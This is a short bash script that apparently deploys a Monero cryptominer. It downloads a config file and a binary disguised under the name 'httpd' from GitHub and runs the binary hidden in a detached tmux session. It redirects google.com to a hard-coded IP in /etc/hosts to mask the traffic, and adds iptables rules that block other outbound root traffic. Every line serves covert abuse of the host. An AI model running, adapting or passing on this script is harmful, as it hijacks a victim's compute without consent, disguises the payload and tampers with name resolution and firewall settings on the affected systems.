#!/bin/bash

sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
sudo chmod +x httpd
sudo -- sh -c "echo '103.145.255.41  google.com' >> /etc/hosts"
sudo tmux new-session -d -s my_session1  './httpd'
sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
sudo iptables -I OUTPUT 2 -p tcp -d google.com -j ACCEPT
sudo iptables -I OUTPUT 3 -p tcp -d 103.145.255.41 -j ACCEPT
sudo iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP





